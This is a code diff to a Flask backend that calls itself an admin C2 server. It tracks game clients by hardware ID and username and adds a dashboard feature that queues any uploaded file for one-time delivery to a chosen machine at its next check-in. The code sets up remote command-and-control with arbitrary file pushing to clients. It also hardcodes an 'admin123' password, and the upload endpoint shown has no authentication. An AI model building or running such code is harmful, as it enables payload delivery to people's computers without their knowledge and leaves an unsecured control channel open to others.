@@ -1,7 +1,7 @@
-# backend.py – Admin C2 Server with username tracking
 from flask import Flask, request, jsonify, render_template_string
 import json
 import os
+import base64
 from datetime import datetime, timedelta
 
 app = Flask(__name__)
@@ -23,6 +23,7 @@ def save_data(data):
         json.dump(data, f, indent=4)
 
 PLAYERS = load_data()   # hwid -> { 'first_seen', 'last_seen', 'status', 'settings_override', 'usernames': [] }
+PENDING_FILES = {}      # hwid -> {'filename': name, 'content_b64': base64string}
 
 ADMIN_PASSWORD = "admin123"  # CHANGE THIS!
 
@@ -32,7 +33,7 @@ def add_username(hwid, username):
         PLAYERS[hwid].setdefault('usernames', []).append(username)
 
 # ============================================
-# HTML ADMIN DASHBOARD
+# HTML ADMIN DASHBOARD (with file upload)
 # ============================================
 DASHBOARD_HTML = """
 <!DOCTYPE html>
@@ -55,13 +56,19 @@ DASHBOARD_HTML = """
         .btn-ban { background: #e74c3c; color: white; }
         .btn-unban { background: #27ae60; color: white; }
         .btn-copy { background: #3498db; color: white; }
+        .btn-file { background: #9b59b6; color: white; }
         .btn-kick:hover { background: #f39c12; }
         .btn-ban:hover { background: #c0392b; }
         .btn-unban:hover { background: #2ecc71; }
         .btn-copy:hover { background: #2980b9; }
+        .btn-file:hover { background: #8e44ad; }
         .settings-input { width: 80px; padding: 3px; background: #222; color: #fff; border: 1px solid #555; }
         .settings-btn { padding: 3px 8px; background: #3498db; color: white; border: none; border-radius: 3px; cursor: pointer; }
         .settings-btn:hover { background: #2980b9; }
+        .file-upload { display: inline-block; }
+        .file-upload input[type="file"] { display: none; }
+        .file-upload label { background: #9b59b6; color: white; padding: 4px 10px; border-radius: 3px; cursor: pointer; }
+        .file-upload label:hover { background: #8e44ad; }
         .timestamp { color: #888; font-size: 0.8em; }
         .log-hwid { font-family: monospace; }
         .username-list { font-weight: bold; color: #0f0; }
@@ -73,13 +80,38 @@ DASHBOARD_HTML = """
                 alert('HWID copied: ' + hwid);
             });
         }
+        function uploadFile(hwid) {
+            const fileInput = document.getElementById('fileInput_' + hwid);
+            const file = fileInput.files[0];
+            if (!file) {
+                alert('Please select a file.');
+                return;
+            }
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const content = e.target.result; // base64
+                fetch('/admin/upload_file', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ hwid: hwid, filename: file.name, content_b64: content.split(',')[1] })
+                }).then(res => {
+                    if (res.status === 204) {
+                        alert('File sent successfully.');
+                        fileInput.value = '';
+                    } else {
+                        alert('Failed to send file.');
+                    }
+                }).catch(err => alert('Error: ' + err));
+            };
+            reader.readAsDataURL(file);
+        }
     </script>
 </head>
 <body>
     <h1>⚡ Attestation C2 Console</h1>
     <p>Active players (last 20s): <span id="active-count">{{ active_players|length }}</span></p>
     <table>
-        <thead><tr><th>HWID</th><th>Username(s)</th><th>Last Seen</th><th>Status</th><th>Settings Override</th><th>Actions</th></tr></thead>
+        <thead><tr><th>HWID</th><th>Username(s)</th><th>Last Seen</th><th>Status</th><th>Settings Override</th><th>Send File</th><th>Actions</th></tr></thead>
         <tbody>
         {% for hwid, data in active_players.items() %}
         <tr class="active">
@@ -97,6 +129,13 @@ DASHBOARD_HTML = """
                     <input type="text" name="value" placeholder="True/False" class="settings-input" value="{{ data.settings_override.get('value', '') }}">
                     <button type="submit" class="settings-btn">Set</button>
                 </form>
+            </td>
+            <td>
+                <div class="file-upload">
+                    <input type="file" id="fileInput_{{ hwid }}">
+                    <label for="fileInput_{{ hwid }}">Choose file</label>
+                    <button class="btn btn-file" onclick="uploadFile('{{ hwid }}')">Send</button>
+                </div>
             </td>
             <td>
                 <form method="POST" action="/admin/kick" style="display:inline;">
@@ -249,24 +288,26 @@ def register():
         if username:
             add_username(hwid, username)
 
-    # If status is 'kicked', respond with kicked and then reset to active
     status = PLAYERS[hwid]['status']
-    if status == 'kicked':
-        response = {'status': 'kicked', 'settings_override': PLAYERS[hwid].get('settings_override', {})}
-        PLAYERS[hwid]['status'] = 'active'
-        PLAYERS[hwid]['settings_override'] = {}
-        save_data(PLAYERS)
-        return jsonify(response)
-
     response = {
-        'status': PLAYERS[hwid]['status'],
+        'status': status,
         'settings_override': PLAYERS[hwid].get('settings_override', {})
     }
+
+    # Check for pending file
+    if hwid in PENDING_FILES:
+        response['file_payload'] = PENDING_FILES[hwid]
+        del PENDING_FILES[hwid]   # one-time delivery
+
+    if status == 'kicked':
+        PLAYERS[hwid]['status'] = 'active'
+        PLAYERS[hwid]['settings_override'] = {}
+
     save_data(PLAYERS)
     return jsonify(response)
 
 # ============================================
-# ADMIN ACTIONS (unchanged)
+# ADMIN ACTIONS
 # ============================================
 @app.route('/admin/ban', methods=['POST'])
 def ban_player():
@@ -306,6 +347,20 @@ def set_settings():
             value = int(value)
         PLAYERS[hwid]['settings_override'] = {'setting': setting, 'value': value}
         save_data(PLAYERS)
+    return '', 204
+
+@app.route('/admin/upload_file', methods=['POST'])
+def upload_file():
+    data = request.json
+    hwid = data.get('hwid')
+    filename = data.get('filename')
+    content_b64 = data.get('content_b64')
+    if not hwid or not filename or not content_b64:
+        return jsonify({'error': 'missing fields'}), 400
+    if hwid not in PLAYERS:
+        return jsonify({'error': 'hwid not found'}), 404
+    PENDING_FILES[hwid] = {'filename': filename, 'content_b64': content_b64}
+    print(f"[+] File queued for {hwid}: {filename}")
     return '', 204
 
 if __name__ == '__main__':
